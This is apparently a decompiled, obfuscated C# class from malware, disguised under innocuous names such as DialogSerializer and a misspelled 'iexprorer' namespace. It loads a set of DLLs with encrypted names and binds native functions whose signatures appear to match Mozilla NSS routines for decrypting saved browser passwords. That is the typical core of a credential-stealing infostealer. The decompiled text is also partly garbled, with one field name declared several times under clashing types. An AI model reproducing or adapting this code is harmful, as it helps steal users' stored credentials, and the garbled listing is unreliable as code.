using System;
using System.Runtime.InteropServices;
using System.Text;

namespace iexprorer;

internal sealed class DialogSerializer
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long FormType(string string_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long StoreStack();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long EditorInfo(long long_0, bool bool_0, long long_1);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int BookmarkEditor(IntPtr intptr_0, IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int ActivityType(ref ContextList contextList_0, ref ContextList contextList_1, int int_0);

	public sealed class ReferenceLayout
	{
		public static byte[] valuesMap;

		public static long valuesMap;
	}

	public struct ContextList
	{
		public int valuesMap;

		public int valuesSet;

		public int activeGenerator;
	}

	private static IntPtr valuesMap;

	public static string valuesMap;

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	[DllImport("kernel32", SetLastError = true)]
	private static extern IntPtr LoadLibrary(string string_0);

	public static long ProcessPciture(string string_0)
	{
		string text = Icon.DeployStream() + _003CModule_003E.smethod_0("ዂዓዱዤዷዲዲዿኾዘዷዬዻዸዱዦዂ", 4766);
		LoadLibrary(text + _003CModule_003E.smethod_0("\u1abb\u1ab9᪬\u1ab5᪤᪢\u1ae7\u1aef\u1af8\u1ab2\u1aba\u1aba", 6870));
		LoadLibrary(text + _003CModule_003E.smethod_0("ᡳᡮᡭᡯᠩᠳ\u1879ᡱᡱ", 6173));
		LoadLibrary(text + _003CModule_003E.smethod_0("ਹਥਪ\u0a7d੧ਭਥਥ", 2633));
		LoadLibrary(text + _003CModule_003E.smethod_0("ɰɬɤɳȴȮɤɬɬ", 512));
		LoadLibrary(text + _003CModule_003E.smethod_0("ᔣᔣᔥᔤᔹᔼᕣᕾᔴᔼᔼ", 5456));
		LoadLibrary(text + _003CModule_003E.smethod_0("ĽĿĪģġļĹĤĵţžĴļļ", 336));
		LoadLibrary(text + _003CModule_003E.smethod_0("−∏∏∉∈∕∐≏≒∘∐∐", 8828));
		LoadLibrary(text + _003CModule_003E.smethod_0("\u085bࡇࡎ\u085cࡇࡃࡆ\u081bࠆࡌࡄࡄ", 2088));
		DialogSerializer.valuesMap = LoadLibrary(text + _003CModule_003E.smethod_0("ᕊᕗᕗᔗᔊᕀᕈᕈ", 5412));
		FormType formType = (FormType)Marshal.GetDelegateForFunctionPointer(GetProcAddress(DialogSerializer.valuesMap, _003CModule_003E.smethod_0("ڜځځڍڛڼڻڦ", 1746)), typeof(FormType));
		return formType(string_0);
	}

	public static int ProcessPciture(IntPtr intptr_0, IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0)
	{
		BookmarkEditor bookmarkEditor = (BookmarkEditor)Marshal.GetDelegateForFunctionPointer(GetProcAddress(DialogSerializer.valuesMap, _003CModule_003E.smethod_0("\u1cd9᳄᳄\u1cd5ᳶ\u1ce4ᳲᲡᲣ\u1cc8᳓ᳲ\u1cf4\u1cf8ᳳᳲ\u1cd5\u1ce2ᳱᳱᳲ\u1ce5", 7319)), typeof(BookmarkEditor));
		return bookmarkEditor(intptr_0, intptr_1, stringBuilder_0, int_0);
	}

	public static long ProcessPciture(long long_0, bool bool_0, long long_1)
	{
		EditorInfo editorInfo = (EditorInfo)Marshal.GetDelegateForFunctionPointer(GetProcAddress(DialogSerializer.valuesMap, _003CModule_003E.smethod_0("ঙ\u0982৸৸খঈ\u09bcঽডবধঽঠপনঽব", 2505)), typeof(EditorInfo));
		return editorInfo(long_0, bool_0, long_1);
	}

	public static long ProcessPciture()
	{
		StoreStack storeStack = (StoreStack)Marshal.GetDelegateForFunctionPointer(GetProcAddress(DialogSerializer.valuesMap, _003CModule_003E.smethod_0("ᠯᠴᡎᡎᠠᠸ\u181a\u180bᠶ᠑\u180b\u181a\u180d᠑\u181e᠓ᠴ\u181a᠆ᠬ᠓᠐\u180b", 6271)), typeof(StoreStack));
		return storeStack();
	}

	public static int ProcessPciture(ref ContextList contextList_0, ref ContextList contextList_1, int int_0)
	{
		ActivityType activityType = (ActivityType)Marshal.GetDelegateForFunctionPointer(GetProcAddress(DialogSerializer.valuesMap, _003CModule_003E.smethod_0("ẘẃỹỹẛẌẚẗẌậẫẺằẸẼ", 7880)), typeof(ActivityType));
		return activityType(ref contextList_0, ref contextList_1, int_0);
	}
}
